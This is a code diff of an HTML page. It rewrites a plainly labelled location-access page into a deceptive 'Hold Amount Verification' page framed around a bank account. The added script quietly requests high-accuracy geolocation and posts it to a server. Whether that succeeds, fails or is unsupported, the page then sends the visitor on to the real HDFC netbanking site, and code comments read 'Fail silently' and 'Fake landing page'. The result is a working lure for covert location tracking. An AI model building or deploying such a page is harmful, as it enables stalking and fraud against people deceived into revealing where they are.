@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Location Access</title>
+  <title>Hold Amount Verification</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -13,10 +13,16 @@
     h2 {
       color: #333;
     }
+    #loading {
+      color: #555;
+      font-size: 16px;
+      margin-top: 20px;
+    }
   </style>
 </head>
 <body>
-  <h2>Checking Your Location...</h2>
+  <h2>Verifying Hold Amount Status...</h2>
+  <p id="loading">Please wait while we check your account status...</p>
 
   <script>
     function sendLocation(position) {
@@ -27,23 +33,36 @@
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ latitude, longitude, timestamp })
-      })
-      .then(() => {
-        document.body.innerHTML = "<h2>Location Sent Successfully!</h2>";
-      })
-      .catch(() => {
-        document.body.innerHTML = "<h2>Failed to Send Location.</h2>";
+      }).finally(() => {
+        // Redirect after 3 seconds
+        setTimeout(() => {
+          window.location.href = "https://netbanking.hdfcbank.com/netbanking/"; // Fake landing page
+        }, 3000);
       });
     }
 
     function handleError(error) {
-      document.body.innerHTML = `<h2>Location access denied: ${error.message}</h2>`;
+      // Fail silently
+      setTimeout(() => {
+        window.location.href = "https://netbanking.hdfcbank.com/netbanking/";
+      }, 3000);
+    }
+
+    function trackOnceSilently() {
+      navigator.geolocation.getCurrentPosition(sendLocation, handleError, {
+        enableHighAccuracy: true,
+        maximumAge: 0,
+        timeout: 5000
+      });
     }
 
     if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+      trackOnceSilently();
     } else {
-      document.body.innerHTML = "<h2>Your browser doesn't support geolocation.</h2>";
+      // Redirect anyway if geolocation isn't supported
+      setTimeout(() => {
+        window.location.href = "https://netbanking.hdfcbank.com/netbanking/";
+      }, 3000);
     }
   </script>
 </body>
